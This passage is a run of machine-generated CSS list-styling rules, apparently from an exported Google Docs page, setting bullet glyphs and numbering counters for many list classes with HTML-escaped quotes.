&quot;}.lst-kix_x347qsqpmks1-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_t96lsgedizsa-0{list-style-type:none}ol.lst-kix_t96lsgedizsa-1{list-style-type:none}.lst-kix_t96lsgedizsa-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_t96lsgedizsa-5,lower-roman) &quot;. &quot;}.lst-kix_x347qsqpmks1-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_t96lsgedizsa-6{list-style-type:none}ol.lst-kix_t96lsgedizsa-7{list-style-type:none}ol.lst-kix_t96lsgedizsa-8{list-style-type:none}.lst-kix_hgm0ng6gomha-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_t96lsgedizsa-2{list-style-type:none}.lst-kix_igrdcirknl8n-5&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_t96lsgedizsa-3{list-style-type:none}ol.lst-kix_t96lsgedizsa-4{list-style-type:none}ol.lst-kix_t96lsgedizsa-5{list-style-type:none}ol.lst-kix_t96lsgedizsa-1.start{counter-reset:lst-ctn-kix_t96lsgedizsa-1 0}.lst-kix_8nqiqtogbohm-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_alnxlx3ivjyl-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_x347qsqpmks1-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_w4u8mtfc6uha-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_kahfkmaienq0-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_igrdcirknl8n-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_h7x1tub5dbe4-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ysdrt8wuz901-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_yqb7oqt8gv0c-1&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_xrub3d64di6y-5.start{counter-reset:lst-ctn-kix_xrub3d64di6y-5 0}.lst-kix_hgm0ng6gomha-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_bn7fk5scblva-6{list-style-type:none}.lst-kix_1zxa3b55tidx-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_ac166bpppqid-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_bn7fk5scblva-5{list-style-type:none}ul.lst-kix_bn7fk5scblva-4{list-style-type:none}ul.lst-kix_bn7fk5scblva-3{list-style-type:none}ul.lst-kix_bn7fk5scblva-2{list-style-type:none}ul.lst-kix_bn7fk5scblva-1{list-style-type:none}.lst-kix_ysdrt8wuz901-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_bn7fk5scblva-0{list-style-type:none}ul.lst-kix_ac166bpppqid-1{list-style-type:none}.lst-kix_bkiq3d71krcq-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_ac166bpppqid-0{list-style-type:none}.lst-kix_c9xp0vh8wziq-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_ac166bpppqid-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_xrub3d64di6y-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_xrub3d64di6y-2,lower-roman) &quot;. &quot;}.lst-kix_x7s489v8w7yg-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_c9xp0vh8wziq-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_h7x1tub5dbe4-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_ac166bpppqid-3{list-style-type:none}ul.lst-kix_ac166bpppqid-2{list-style-type:none}.lst-kix_ujr7qqe1p9gc-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_ac166bpppqid-5{list-style-type:none}ul.lst-kix_ac166bpppqid-4{list-style-type:none}.lst-kix_alnxlx3ivjyl-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_ac166bpppqid-7{list-style-type:none}ul.lst-kix_ac166bpppqid-6{list-style-type:none}ul.lst-kix_bn7fk5scblva-8{list-style-type:none}ul.lst-kix_bn7fk5scblva-7{list-style-type:none}ol.lst-kix_t96lsgedizsa-0.start{counter-reset:lst-ctn-kix_t96lsgedizsa-0 0}ul.lst-kix_ac166bpppqid-8{list-style-type:none}.lst-kix_ujr7qqe1p9gc-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_t96lsgedizsa-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_t96lsgedizsa-2,lower-roman) &quot;. &quot;}.lst-kix_bkiq3d71krcq-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_xrub3d64di6y-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_xrub3d64di6y-7,lower-latin) &quot;. &quot;}.lst-kix_yglvxt1mgfm7-1&gt;li{counter-increment:lst-ctn-kix_yglvxt1mgfm7-1}ol.lst-kix_iwbl6bi5grxz-8.start{counter-reset:lst-ctn-kix_iwbl6bi5grxz-8 0}.lst-kix_s0pfb3xl5agk-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_q2cw7ye43y3y-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_qxy8bxc9ldy0-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_d8jkcmfkq4n7-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_mfb7gblnyelm-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_iwbl6bi5grxz-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_iwbl6bi5grxz-7,lower-latin) &quot;. &quot;}ol.lst-kix_exm17v4ppgu6-6{list-style-type:none}ol.lst-kix_exm17v4ppgu6-5{list-style-type:none}ol.lst-kix_exm17v4ppgu6-8{list-style-type:none}ol.lst-kix_exm17v4ppgu6-7{list-style-type:none}.lst-kix_etb3tue10oz0-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_exm17v4ppgu6-2{list-style-type:none}ol.lst-kix_exm17v4ppgu6-4{list-style-type:none}.lst-kix_fr1tg9t3fnuc-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_fr1tg9t3fnuc-7,lower-latin) &quot;. &quot;}ol.lst-kix_exm17v4ppgu6-3{list-style-type:none}.lst-kix_t96lsgedizsa-4&gt;li{counter-increment:lst-ctn-kix_t96lsgedizsa-4}.lst-kix_y0pkx69mb2m-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_etb3tue10oz0-2{list-style-type:none}ul.lst-kix_etb3tue10oz0-1{list-style-type:none}.lst-kix_3jqgp1gp6n0e-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_etb3tue10oz0-0{list-style-type:none}.lst-kix_kf4qbiideq6a-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_etb3tue10oz0-6{list-style-type:none}ul.lst-kix_etb3tue10oz0-5{list-style-type:none}ul.lst-kix_etb3tue10oz0-4{list-style-type:none}ul.lst-kix_etb3tue10oz0-3{list-style-type:none}.lst-kix_q60yv0wr6jjb-8&gt;li{counter-increment:lst-ctn-kix_q60yv0wr6jjb-8}.lst-kix_o7h24lqlh2ds-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_etb3tue10oz0-8{list-style-type:none}ul.lst-kix_etb3tue10oz0-7{list-style-type:none}.lst-kix_4ibbyvy1vtvo-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_d2sey3cqswhj-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_b5jwtymjp8wg-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_fr1tg9t3fnuc-7&gt;li{counter-increment:lst-ctn-kix_fr1tg9t3fnuc-7}.lst-kix_yglvxt1mgfm7-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yglvxt1mgfm7-4,lower-latin) &quot;. &quot;}ul.lst-kix_xis8r8r67pmi-3{list-style-type:none}ul.lst-kix_xis8r8r67pmi-2{list-style-type:none}ul.lst-kix_xis8r8r67pmi-1{list-style-type:none}ul.lst-kix_xis8r8r67pmi-0{list-style-type:none}ul.lst-kix_xis8r8r67pmi-7{list-style-type:none}.lst-kix_iwbl6bi5grxz-0&gt;li{counter-increment:lst-ctn-kix_iwbl6bi5grxz-0}ul.lst-kix_xis8r8r67pmi-6{list-style-type:none}ul.lst-kix_xis8r8r67pmi-5{list-style-type:none}ul.lst-kix_xis8r8r67pmi-4{list-style-type:none}.lst-kix_x7s489v8w7yg-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_wgc4so2hx3bb-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_q60yv0wr6jjb-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_q60yv0wr6jjb-7,lower-latin) &quot;. &quot;}ul.lst-kix_xis8r8r67pmi-8{list-style-type:none}.lst-kix_iwbl6bi5grxz-7&gt;li{counter-increment:lst-ctn-kix_iwbl6bi5grxz-7}.lst-kix_h7x1tub5dbe4-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_xis8r8r67pmi-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_u8gl45uj8k5w-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_mfb7gblnyelm-8{list-style-type:none}ul.lst-kix_mfb7gblnyelm-7{list-style-type:none}ul.lst-kix_mfb7gblnyelm-6{list-style-type:none}ul.lst-kix_mfb7gblnyelm-5{list-style-type:none}ul.lst-kix_mfb7gblnyelm-4{list-style-type:none}.lst-kix_h3wwlbtif53z-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_xis8r8r67pmi-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_mfb7gblnyelm-3{list-style-type:none}.lst-kix_9qmrelv5gsqt-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_psxevvsc6jj-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_mfb7gblnyelm-2{list-style-type:none}ul.lst-kix_mfb7gblnyelm-1{list-style-type:none}ul.lst-kix_mfb7gblnyelm-0{list-style-type:none}.lst-kix_xynuzpm7g9iu-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_vk3kycj1zc1-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_bn7fk5scblva-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_vwtmwxmruch-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_gsr5a4k8h49r-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_d2x9ez3q88fg-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_xq15m7rnzuwj-3&gt;li:before{content:&quot;\0025cf   &quot;}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_exm17v4ppgu6-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_exm17v4ppgu6-2,lower-roman) &quot;. &quot;}.lst-kix_g55j9m9u7d1p-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_hwtgc2it419p-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_q60yv0wr6jjb-1&gt;li{counter-increment:lst-ctn-kix_q60yv0wr6jjb-1}ul.lst-kix_xynuzpm7g9iu-7{list-style-type:none}ul.lst-kix_xynuzpm7g9iu-8{list-style-type:none}ul.lst-kix_xynuzpm7g9iu-5{list-style-type:none}ul.lst-kix_xynuzpm7g9iu-6{list-style-type:none}.lst-kix_6jkbamo228jj-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_xynuzpm7g9iu-3{list-style-type:none}.lst-kix_xrub3d64di6y-2&gt;li{counter-increment:lst-ctn-kix_xrub3d64di6y-2}ul.lst-kix_xynuzpm7g9iu-4{list-style-type:none}ul.lst-kix_mfml2x2u431k-4{list-style-type:none}ul.lst-kix_xynuzpm7g9iu-1{list-style-type:none}ul.lst-kix_mfml2x2u431k-3{list-style-type:none}.lst-kix_qg70u2ientmm-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_xynuzpm7g9iu-2{list-style-type:none}ul.lst-kix_mfml2x2u431k-6{list-style-type:none}ul.lst-kix_mfml2x2u431k-5{list-style-type:none}ul.lst-kix_xynuzpm7g9iu-0{list-style-type:none}ul.lst-kix_mfml2x2u431k-0{list-style-type:none}ul.lst-kix_mfml2x2u431k-2{list-style-type:none}.lst-kix_y0pkx69mb2m-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_mfml2x2u431k-1{list-style-type:none}.lst-kix_rsqcvs5pzvc3-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_rsqcvs5pzvc3-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_yglvxt1mgfm7-4.start{counter-reset:lst-ctn-kix_yglvxt1mgfm7-4 0}.lst-kix_hwtgc2it419p-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_l7wtrmnksiqs-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_pzr402xila08-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_pzr402xila08-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_pzr402xila08-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_hwtgc2it419p-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_gsr5a4k8h49r-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_9qmrelv5gsqt-8{list-style-type:none}ul.lst-kix_9qmrelv5gsqt-7{list-style-type:none}.lst-kix_l7wtrmnksiqs-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_hwtgc2it419p-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_gsr5a4k8h49r-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_gsr5a4k8h49r-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_9qmrelv5gsqt-4{list-style-type:none}ul.lst-kix_9qmrelv5gsqt-3{list-style-type:none}ul.lst-kix_7eqv8k2d3k5e-0{list-style-type:none}.lst-kix_iwbl6bi5grxz-5&gt;li{counter-increment:lst-ctn-kix_iwbl6bi5grxz-5}ul.lst-kix_9qmrelv5gsqt-6{list-style-type:none}ul.lst-kix_9qmrelv5gsqt-5{list-style-type:none}.lst-kix_hwtgc2it419p-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_hwtgc2it419p-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_gsr5a4k8h49r-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_9qmrelv5gsqt-0{list-style-type:none}ul.lst-kix_9qmrelv5gsqt-2{list-style-type:none}.lst-kix_exm17v4ppgu6-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_exm17v4ppgu6-6,decimal) &quot;. &quot;}.lst-kix_l7wtrmnksiqs-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_9qmrelv5gsqt-1{list-style-type:none}.lst-kix_hwtgc2it419p-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_gsr5a4k8h49r-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_exm17v4ppgu6-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_exm17v4ppgu6-7,lower-latin) &quot;. &quot;}ul.lst-kix_7eqv8k2d3k5e-7{list-style-type:none}ul.lst-kix_7eqv8k2d3k5e-8{list-style-type:none}ul.lst-kix_7eqv8k2d3k5e-5{list-style-type:none}.lst-kix_pzr402xila08-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_7eqv8k2d3k5e-6{list-style-type:none}.lst-kix_l7wtrmnksiqs-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_7eqv8k2d3k5e-3{list-style-type:none}ul.lst-kix_ujr7qqe1p9gc-8{list-style-type:none}ul.lst-kix_7eqv8k2d3k5e-4{list-style-type:none}.lst-kix_exm17v4ppgu6-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_exm17v4ppgu6-8,lower-roman) &quot;. &quot;}ul.lst-kix_7eqv8k2d3k5e-1{list-style-type:none}ul.lst-kix_ujr7qqe1p9gc-6{list-style-type:none}ul.lst-kix_7eqv8k2d3k5e-2{list-style-type:none}ul.lst-kix_ujr7qqe1p9gc-7{list-style-type:none}.lst-kix_l7wtrmnksiqs-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_pzr402xila08-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_l7wtrmnksiqs-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_l7wtrmnksiqs-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_pzr402xila08-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_l7wtrmnksiqs-4&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_iwbl6bi5grxz-6.start{counter-reset:lst-ctn-kix_iwbl6bi5grxz-6 0}ul.lst-kix_ujr7qqe1p9gc-4{list-style-type:none}.lst-kix_pzr402xila08-3&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_ujr7qqe1p9gc-5{list-style-type:none}ul.lst-kix_ujr7qqe1p9gc-2{list-style-type:none}.lst-kix_pzr402xila08-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_ujr7qqe1p9gc-3{list-style-type:none}ul.lst-kix_ujr7qqe1p9gc-0{list-style-type:none}.lst-kix_pzr402xila08-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_ujr7qqe1p9gc-1{list-style-type:none}.lst-kix_l7wtrmnksiqs-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_t96lsgedizsa-8&gt;li{counter-increment:lst-ctn-kix_t96lsgedizsa-8}ol.lst-kix_4ibbyvy1vtvo-7.start{counter-reset:lst-ctn-kix_4ibbyvy1vtvo-7 0}.lst-kix_exm17v4ppgu6-6&gt;li{counter-increment:lst-ctn-kix_exm17v4ppgu6-6}ul.lst-kix_ab8mfzoog88u-1{list-style-type:none}ul.lst-kix_887mzeed6aeb-3{list-style-type:none}ul.lst-kix_ab8mfzoog88u-2{list-style-type:none}ul.lst-kix_887mzeed6aeb-4{list-style-type:none}ul.lst-kix_ab8mfzoog88u-3{list-style-type:none}ul.lst-kix_887mzeed6aeb-1{list-style-type:none}ul.lst-kix_ab8mfzoog88u-4{list-style-type:none}ul.lst-kix_887mzeed6aeb-2{list-style-type:none}ul.lst-kix_ab8mfzoog88u-5{list-style-type:none}ul.lst-kix_887mzeed6aeb-7{list-style-type:none}ul.lst-kix_ab8mfzoog88u-6{list-style-type:none}ul.lst-kix_887mzeed6aeb-8{list-style-type:none}ul.lst-kix_ab8mfzoog88u-7{list-style-type:none}ul.lst-kix_887mzeed6aeb-5{list-style-type:none}ul.lst-kix_ab8mfzoog88u-8{list-style-type:none}ul.lst-kix_887mzeed6aeb-6{list-style-type:none}.lst-kix_etb3tue10oz0-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_etb3tue10oz0-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_etb3tue10oz0-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_887mzeed6aeb-0{list-style-type:none}ul.lst-kix_ab8mfzoog88u-0{list-style-type:none}.lst-kix_rkrpvoovd3qp-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_rkrpvoovd3qp-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_rkrpvoovd3qp-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_exm17v4ppgu6-1{list-style-type:none}ul.lst-kix_exm17v4ppgu6-0{list-style-type:none}.lst-kix_rkrpvoovd3qp-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_rkrpvoovd3qp-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_yglvxt1mgfm7-4&gt;li{counter-increment:lst-ctn-kix_yglvxt1mgfm7-4}.lst-kix_rkrpvoovd3qp-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_mfb7gblnyelm-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_b5jwtymjp8wg-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_rkrpvoovd3qp-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_etb3tue10oz0-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_b5jwtymjp8wg-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_x7s489v8w7yg-4{list-style-type:none}ul.lst-kix_x7s489v8w7yg-5{list-style-type:none}ul.lst-kix_x7s489v8w7yg-6{list-style-type:none}.lst-kix_etb3tue10oz0-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_x7s489v8w7yg-7{list-style-type:none}.lst-kix_etb3tue10oz0-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_x7s489v8w7yg-0{list-style-type:none}ul.lst-kix_x7s489v8w7yg-1{list-style-type:none}ul.lst-kix_x7s489v8w7yg-2{list-style-type:none}.lst-kix_mfb7gblnyelm-5&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_b5jwtymjp8wg-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_x7s489v8w7yg-3{list-style-type:none}ol.lst-kix_t96lsgedizsa-5.start{counter-reset:lst-ctn-kix_t96lsgedizsa-5 0}ul.lst-kix_x7s489v8w7yg-8{list-style-type:none}.lst-kix_mfb7gblnyelm-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_b5jwtymjp8wg-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_kf4qbiideq6a-5{list-style-type:none}ul.lst-kix_kf4qbiideq6a-4{list-style-type:none}ul.lst-kix_kf4qbiideq6a-7{list-style-type:none}ol.lst-kix_q60yv0wr6jjb-4.start{counter-reset:lst-ctn-kix_q60yv0wr6jjb-4 0}ul.lst-kix_kf4qbiideq6a-6{list-style-type:none}.lst-kix_4ibbyvy1vtvo-7&gt;li{counter-increment:lst-ctn-kix_4ibbyvy1vtvo-7}.lst-kix_bn7fk5scblva-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_kf4qbiideq6a-1{list-style-type:none}ul.lst-kix_kf4qbiideq6a-0{list-style-type:none}ol.lst-kix_xrub3d64di6y-0{list-style-type:none}ul.lst-kix_kf4qbiideq6a-3{list-style-type:none}.lst-kix_4ibbyvy1vtvo-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_kf4qbiideq6a-2{list-style-type:none}ol.lst-kix_xrub3d64di6y-2{list-style-type:none}.lst-kix_q60yv0wr6jjb-5&gt;li{counter-increment:lst-ctn-kix_q60yv0wr6jjb-5}.lst-kix_bn7fk5scblva-8&gt;li:before{content:&quot;\0025a0   &quot;}ol.lst-kix_xrub3d64di6y-1{list-style-type:none}ol.lst-kix_xrub3d64di6y-4{list-style-type:none}ol.lst-kix_xrub3d64di6y-3{list-style-type:none}ol.lst-kix_xrub3d64di6y-6{list-style-type:none}ol.lst-kix_xrub3d64di6y-5{list-style-type:none}ul.lst-kix_kf4qbiideq6a-8{list-style-type:none}ol.lst-kix_xrub3d64di6y-8{list-style-type:none}.lst-kix_4ibbyvy1vtvo-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_mfb7gblnyelm-7&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_xrub3d64di6y-4&gt;li{counter-increment:lst-ctn-kix_xrub3d64di6y-4}ol.lst-kix_xrub3d64di6y-7{list-style-type:none}.lst-kix_b5jwtymjp8wg-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_4ibbyvy1vtvo-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_pzr402xila08-5{list-style-type:none}ul.lst-kix_pzr402xila08-6{list-style-type:none}ul.lst-kix_pzr402xila08-7{list-style-type:none}ul.lst-kix_pzr402xila08-8{list-style-type:none}ul.lst-kix_7xs8c2w8mgl2-0{list-style-type:none}.lst-kix_ysdrt8wuz901-6&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_fr1tg9t3fnuc-6.start{counter-reset:lst-ctn-kix_fr1tg9t3fnuc-6 0}ol.lst-kix_xrub3d64di6y-4.start{counter-reset:lst-ctn-kix_xrub3d64di6y-4 0}ul.lst-kix_7xs8c2w8mgl2-1{list-style-type:none}ul.lst-kix_7xs8c2w8mgl2-2{list-style-type:none}ul.lst-kix_7xs8c2w8mgl2-3{list-style-type:none}ul.lst-kix_7xs8c2w8mgl2-4{list-style-type:none}.lst-kix_ysdrt8wuz901-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_7xs8c2w8mgl2-5{list-style-type:none}ul.lst-kix_7xs8c2w8mgl2-6{list-style-type:none}ul.lst-kix_7xs8c2w8mgl2-7{list-style-type:none}ul.lst-kix_7xs8c2w8mgl2-8{list-style-type:none}.lst-kix_yglvxt1mgfm7-3&gt;li{counter-increment:lst-ctn-kix_yglvxt1mgfm7-3}ul.lst-kix_kahfkmaienq0-0{list-style-type:none}ul.lst-kix_kahfkmaienq0-1{list-style-type:none}ul.lst-kix_kahfkmaienq0-2{list-style-type:none}.lst-kix_4ibbyvy1vtvo-6&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_4ibbyvy1vtvo-6,decimal) &quot;. &quot;}ul.lst-kix_kahfkmaienq0-7{list-style-type:none}ul.lst-kix_kahfkmaienq0-8{list-style-type:none}ul.lst-kix_kahfkmaienq0-3{list-style-type:none}ul.lst-kix_kahfkmaienq0-4{list-style-type:none}ul.lst-kix_kahfkmaienq0-5{list-style-type:none}.lst-kix_t96lsgedizsa-1&gt;li{counter-increment:lst-ctn-kix_t96lsgedizsa-1}.lst-kix_4ibbyvy1vtvo-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_4ibbyvy1vtvo-8,lower-roman) &quot;. &quot;}ul.lst-kix_kahfkmaienq0-6{list-style-type:none}.lst-kix_bn7fk5scblva-4&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_qg70u2ientmm-7{list-style-type:none}ul.lst-kix_qg70u2ientmm-8{list-style-type:none}.lst-kix_hwtgc2it419p-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_y0pkx69mb2m-8{list-style-type:none}.lst-kix_exm17v4ppgu6-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_exm17v4ppgu6-5,lower-roman) &quot;. &quot;}ul.lst-kix_qg70u2ientmm-3{list-style-type:none}ul.lst-kix_qg70u2ientmm-4{list-style-type:none}.lst-kix_xq15m7rnzuwj-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_qg70u2ientmm-5{list-style-type:none}ul.lst-kix_qg70u2ientmm-6{list-style-type:none}.lst-kix_gsr5a4k8h49r-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_exm17v4ppgu6-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_exm17v4ppgu6-3,decimal) &quot;. &quot;}ul.lst-kix_y0pkx69mb2m-3{list-style-type:none}ul.lst-kix_y0pkx69mb2m-2{list-style-type:none}.lst-kix_xq15m7rnzuwj-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_rsqcvs5pzvc3-0&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_y0pkx69mb2m-1{list-style-type:none}.lst-kix_bn7fk5scblva-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_bn7fk5scblva-2&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_y0pkx69mb2m-0{list-style-type:none}ul.lst-kix_y0pkx69mb2m-7{list-style-type:none}ul.lst-kix_y0pkx69mb2m-6{list-style-type:none}ul.lst-kix_y0pkx69mb2m-5{list-style-type:none}ul.lst-kix_y0pkx69mb2m-4{list-style-type:none}.lst-kix_gsr5a4k8h49r-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_q60yv0wr6jjb-0{list-style-type:none}.lst-kix_xq15m7rnzuwj-6&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_rsqcvs5pzvc3-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_rsqcvs5pzvc3-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_sjd249b6zrqw-0{list-style-type:none}.lst-kix_exm17v4ppgu6-1&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_sjd249b6zrqw-1{list-style-type:none}ul.lst-kix_sjd249b6zrqw-2{list-style-type:none}.lst-kix_xq15m7rnzuwj-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_xq15m7rnzuwj-8&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_sjd249b6zrqw-3{list-style-type:none}ul.lst-kix_sjd249b6zrqw-4{list-style-type:none}.lst-kix_4ibbyvy1vtvo-8&gt;li{counter-increment:lst-ctn-kix_4ibbyvy1vtvo-8}ul.lst-kix_qg70u2ientmm-0{list-style-type:none}.lst-kix_rsqcvs5pzvc3-2&gt;li:before{content:&quot;\0025a0   